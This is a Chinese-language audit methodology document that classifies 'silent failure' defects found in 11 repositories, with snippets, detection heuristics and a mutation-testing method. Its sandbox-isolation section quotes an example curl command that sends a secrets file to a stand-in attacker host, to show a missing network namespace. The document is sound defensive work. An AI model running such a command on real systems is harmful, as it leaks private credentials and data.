# 隐形失效：11 个仓库审计后的形态归纳

> 这是一份**方法论交付**，不是某个仓库的报告。
> 来源：`TrueFurina` 名下 11 个仓库的深度审计（R59–R101）。
> 配套工具：`tools/audit_probe.py`（可对它自己的仓库跑一遍）。

---

## 零、一句话

**这些缺陷的共同点是：代码能跑、测试能过、CI 是绿的，但守卫其实没在守。**

它们不会被普通测试发现——因为"测试通过"本身就是它们要伪装成的状态。

---

## 一、六种形态

### S1 静默降级

```python
try:
    do_the_important_thing()
except Exception:
    pass          # 失败与正常走同一条路
```

**为什么危险**：调用方无法区分"成功"和"悄悄没做"。更糟的是日志照样打印"已完成"。

**真实案例**
| 仓库 | 表现 |
|---|---|
| xihu | `_win_job_initializer` 注释写"任何失败都静默降级"，而它唯一的守卫测试是空转的 → **事故不可见** |
| marl | 两份同名 `_trim_r_registry`，后定义者静默覆盖前者 |
| skillware | `check_manifest_requirements` 抛 ImportError 是好的反例（它不静默） |

**判据**：`except (bare|Exception)` + 只 `pass`/`continue`/`return None` + 同函数内无日志。

**注意**：`StopIteration` / `CancelledError` / `socket.timeout` 是**正常控制流**，不算。

---

### S2 空跑即通过

```python
bad = [x for x in cited if x not in real]
if bad:
    return 1
print("✅ 通过：所有引用均可在语料中溯源")   # cited 为空时也走这里
return 0
```

**为什么危险**：`空` 有两个来源——**真的没问题**，和**根本没验**。二者走了同一条路。

**真实案例**
| 仓库 | 表现 |
|---|---|
| distillery | 零引用 / 语料 0 个 ID 都打印"✅ 通过"，且三个消费方（GUI/WebUI/HTML）全都渲染成绿灯 |
| marl | `count_offline_verified()` 的 14 与台账一致，但"93 题只有 2 题可复现"没被点明 |
| xihu | KPI 分子诚实、分母的可复现性没交代 |

**判据**：`if bad: return 1` + 后续成功分支，且成功分支前**没有**输入侧非空断言。

**修法**：三态 —— 通过 / 不通过 / **未验证**。让调用方无法把"未验证"读成"通过"。

> 最难的一点：`test_no_citations_is_ok` 这类测试会**主动锁死**错误语义。
> distillery 的原始测试 docstring 甚至写着「但这是『无据可查』，调用方需自行判断质量」——
> **三个调用方谁都没做这个判断**。一条谁都不执行的免责说明，等于没有。

---

### S3 守卫空转

守卫存在、能跑、是绿的，但**判别力为零**。

**四种亚型**
| 亚型 | 案例 |
|---|---|
| 判据本身错 | xihu：用 `OpenProcess(SYNCHRONIZE)` 判断进程存活，zombie 句柄也能打开 → 那条"孤儿进程"回归锁**永远不可能通过** |
| 绕开调用链 | devradar：我第一版测试只测"解码算法的等价复刻"，变异验证时**解码和上限两个变异都没被抓到** |
| 永远跳过 | distillery：测试只搜 `cases/`，而唯一的 CSV 在 `examples/` → 永久 skip |
| 断言太粗 | harness：`assert "bool(allow_network)" not in src` 匹配到了**注释里**的示例 |

**判据**：`skipTest` 无条件调用 / `assert True` / 测试不接触被测函数的真实入口。

**验证方法（唯一可靠）**：**跑变异体**。把实现改回缺陷版，守卫必须变红。
- 不红 = 空转
- 红了但改个无关的地方也红 = 判据太粗
- 两种状态都红 = 判别力为零（xihu 的情况）

### S4 默认值无出处

```python
def alns_assign(..., alpha=10.0, ...):   # 而计分用的是 PENALTY=2.0
```

**为什么危险**：一个没人知道来源的常数，会在某天以"数据不对"的形式暴露——但那时已经很难追溯。

**真实案例**
| 仓库 | 常数 | 后果 |
|---|---|---|
| aerorider | `alpha=10.0`（ALNS 内部）vs `PENALTY=2.0`（计分） | 120/240 单档"完整版"比消融版**更贵** |
| skillware | `balanced` 档要求 `independent>=2` | 单条 high 命中恒为 1 → 典型注入被放行 |
| octop-harness | 三种 unshare 都有，**第四种（网络）没有** | 沙箱只关文件系统，数据通道开着 |

**判据**：函数签名里的数字默认值，在全部 `.md` 文档中零提及。

**共同点**：**这三种都是"默认值从未被审视过"，而不是"故意选错"**。
`alpha=10` 可能是从某个示例抄来的；`independent>=2` 可能是为了压误报调出来的；
`--unshare-net` 可能只是写的时候没想到。它们都缺一次"这个值为什么是这个值"的追问。

### S5 隔离不完整

**真实案例**：octop-harness 的 bwrap jail。

```
--unshare-pid  --unshare-ipc  --unshare-uts     ← 三种都有
（缺 --unshare-net）                              ← 第四种没有
--ro-bind-try /etc/resolv.conf                   ← 还特意让 DNS 能用
```

**后果**：`curl -d @/workspace/secret https://attacker.example` 在"沙箱"里照常工作。

**最值得注意的细节**：`tests/test_bwrap_shell.py` **逐条断言了前三种 unshare**，
唯独没有网络那条。**测了三种 = 让人以为隔离是完整的。**

**判据**：`--unshare-pid` 存在但 `--unshare-net` 不存在；bwrap 缺 `--die-with-parent`。

### S6 文档落后于实现

```python
"""
Generates the tool catalog table in README.md and outputs registry.json.
"""
# —— 实测：跑完生成器 README 逐字节不变，它只写 registry.json
```

**真实案例**：mcphub。后果是 README 与 registry 各自演化，出现 5 处 category 漂移。

**判据**：docstring 声称会写某个文件，函数体里找不到对应写入。

### S7 边界处理缺口

这一类与 S1–S6 不同：它不是"判定语义"问题，而是**流式 I/O 的边界**。

**真实案例**：devradar

```python
buffer += chunk.decode("utf-8")     # TCP 从汉字中间切开 → UnicodeDecodeError
                                     # → except Exception: continue → 整块丢数据
```

以及 `buffer` 无上限（对端持续发不带 `\n` 的数据即可 OOM）。

**我在这个案例上犯的两个错，都值得记**：
1. **只修了一侧**。修完 `server.py` 就收工了，客户端 `client.py` 完全没动。
   这个漏检是**事后写探针扫出来的**——人工审计按"我读过的那个文件"思考，天然有盲区。
2. **测试绕开调用链**。第一版测试只验证"解码算法等价复刻"，变异验证时没抓到。

**判据**：`buffer += chunk.decode(...)` 且无 `getincrementaldecoder`；`buffer +=` 且无 `MAX_*SIZE`。

| 仓库 | 可疑点 | 我在人工审计中确认的真缺陷 |
|---|---:|---|
| cyber-terms-hub | 0 | 0（链接健康度好，问题在时效性与跨平台） |
| aerorider | 1 | 1（ALNS alpha 口径） |
| mcphub | 10 | 1（生成器不写 README，架构性） |
| octop-harness | 13 | 1（网络未隔离） |
| AGI-Distiller | 17 | 1（最小权限自相矛盾） |

**静态扫描只能缩小范围，不能定罪。**

## 三、怎么用这套东西

### 给一个陌生仓库做初筛

```bash
python tools/audit_probe.py <repo>    # 只定位，不下结论
```

### 对每一处报点做三件事

1. **确认它在真实调用路径上**。静态命中可能是死代码。
2. **跑变异体验证**。把实现改坏，看守卫会不会红——这是唯一可靠的判别力检验。
3. **问"谁消费这个结果"**。distillery 的缺陷严重度不在 `verify_citations.py` 本身，
   而在它有**三个消费方**都渲染成绿灯。

### 修的时候守住两条

- **不静默改变默认行为**。octop 的修复里我最终选了"默认不变 + 告警"，
  因为把默认改断网会让既有 skill 静默失效——那是另一种"看起来正常的坏"。
- **测试要双向**。只有"必须拦住"的断言时，把阈值调成"一律拦截"也能全绿。
  skillware 那组测试特意同时有"必须放行"的断言。

## 四、最容易被忽略的一条

**报告里最该写的不是"发现了什么"，而是"我一开始判断错在哪"。**

这 11 轮里我自己犯的错：
| 轮次 | 我的错误判断 | 真相 |
|---|---|---|
| R94 | 以为 `VDNMixer` 是错误缩进成嵌套类 | 是正确的 `if HAS_TORCH:` 条件定义 |
| R94 | 以为测试会覆盖实验数据（diff 删 4 万行） | 是我多次 `git stash` 造成的假象 |
| R95 | 以为 `_mirror_sha256` 自校验失效 | 漏了"先剥键、再截 16 位"两步 |
| R96 | 以为 26 个 GitHub 链接失效 | 是并发压测把 github 打出假 000 |
| R96 | 以为域名已不存在 | `nslookup \| grep` 格式不匹配，实际全部可解析 |
| R97 | 第一版 5 条测试全绿 | 变异验证时**两个变异都没抓到**——空转 |
| R99 | 让生成器自动同步 README | 差点冲掉 47 条**人工精修**的文案 |
| R100 | 加无条件判失败 | 打破了"讨论攻击手法不误报"的既有设计 |
| R101 | 把三态写成 `bool(allow_network)` | 会让既有调用悄悄从联网变断网 |

**九次误判，没有一个是因为"看不出来"，全都是因为"太快下结论"。**

所以这份文档的最后一条建议是：
**每次报缺陷前，先把对方的判据算法照抄一遍。** 抄得出来，说明你懂了；
抄不出来，说明你还没资格下结论。
